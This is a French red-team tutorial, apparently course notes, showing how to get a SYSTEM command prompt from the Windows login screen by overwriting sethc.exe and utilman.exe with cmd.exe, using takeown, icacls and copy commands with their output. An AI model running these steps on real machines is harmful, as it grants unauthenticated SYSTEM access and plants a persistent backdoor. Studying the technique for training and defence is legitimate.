Si nous avons un accès physique à la machine (ou RDP dans notre cas), vous pouvez détourner l'écran de connexion pour accéder à un terminal sans avoir d'informations d'identification valides pour une machine.

Nous examinerons deux méthodes qui s'appuient sur des fonctionnalités d'accessibilité à cette fin.

Touches collantes

Lorsque vous appuyez sur des combinaisons de touches telles que `CTRL + ALT + DEL`, vous pouvez configurer Windows pour qu'il utilise des touches rémanentes, ce qui vous permet d'appuyer sur les boutons d'une combinaison de manière séquentielle plutôt qu'en même temps. En ce sens, si les touches rémanentes sont actives, vous pouvez appuyer et relâcher `CTRL`, appuyer et relâcher `ALT`et enfin appuyer et relâcher `DEL`pour obtenir le même effet qu'en appuyant sur la  `CTRL + ALT + DEL`combinaison.

Pour établir la persistance à l'aide de Sticky Keys, nous abuserons d'un raccourci activé par défaut dans toute installation Windows qui nous permet d'activer Sticky Keys en appuyant `SHIFT`5 fois. Après avoir saisi le raccourci, un écran qui ressemble à ceci devrait généralement s'afficher :

![27e711818bea549ace3cf85279f339c8](https://github.com/dsgsec/Red-Team/assets/82456829/bf22a836-738f-4f6b-acdc-2c8157d812ff)

Après avoir appuyé `SHIFT`5 fois, Windows exécutera le binaire dans `C:\Windows\System32\sethc.exe`. Si nous parvenons à remplacer ce binaire par une charge utile de notre préférence, nous pouvons alors le déclencher avec le raccourci. Fait intéressant, nous pouvons même le faire à partir de l'écran de connexion avant de saisir les informations d'identification.

Un moyen simple de détourner l'écran de connexion consiste à le remplacer `sethc.exe` par une copie de `cmd.exe`. De cette façon, nous pouvons générer une console en utilisant le raccourci des touches rémanentes, même depuis l'écran de journalisation.

Pour écraser `sethc.exe`, nous devons d'abord prendre possession du fichier et accorder à notre utilisateur actuel l'autorisation de le modifier. Ce n'est qu'alors que nous pourrons le remplacer par une copie de `cmd.exe`. Nous pouvons le faire avec les commandes suivantes :

Invite de commande

```
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

Après cela, verrouillez votre session depuis le menu Démarrer :

![2faf2bec5763297beb7c921858900c57](https://github.com/dsgsec/Red-Team/assets/82456829/106fc9a6-b769-4e80-a78a-be295fb9caa5)

Vous devriez maintenant pouvoir appuyer `SHIFT`cinq fois pour accéder à un terminal avec les privilèges SYSTÈME directement depuis l'écran de connexion :

![5062148957ec1d70dccd080bdca93ddf](https://github.com/dsgsec/Red-Team/assets/82456829/d88e7cbf-cf50-4849-adb4-e40fee28cbd9)


Utilman

Utilman est une application Windows intégrée utilisée pour fournir des options de facilité d'accès pendant l'écran de verrouillage :

![73c7698a015de5a988fd815ff3e41473](https://github.com/dsgsec/Red-Team/assets/82456829/6949803c-b647-4602-bc06-39aa1e4563ca)

Lorsque nous cliquons sur le bouton de facilité d'accès sur l'écran de connexion, il s'exécute `C:\Windows\System32\Utilman.exe`avec les privilèges SYSTÈME. Si nous le remplaçons par une copie de `cmd.exe`, nous pouvons à nouveau contourner l'écran de connexion.

Pour remplacer `utilman.exe`, nous effectuons un processus similaire à ce que nous avons fait avec`sethc.exe` :

Invite de commande

```
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

Pour déclencher notre terminal, nous verrouillerons notre écran à partir du bouton démarrer :

![1f94b28361ffebbf70d280755821bc12](https://github.com/dsgsec/Red-Team/assets/82456829/c0f8a235-4827-4df9-adbe-10c55dac96b2)

Et enfin, cliquez sur le bouton « Facilité d'accès ». Puisque nous avons remplacé `utilman.exe`par une `cmd.exe`copie, nous obtiendrons une invite de commande avec les privilèges SYSTEM :

![0fe1901296108241e2700abf87fa6a27](https://github.com/dsgsec/Red-Team/assets/82456829/b8a8ba6a-c8be-4748-8f4e-66fd42551665)
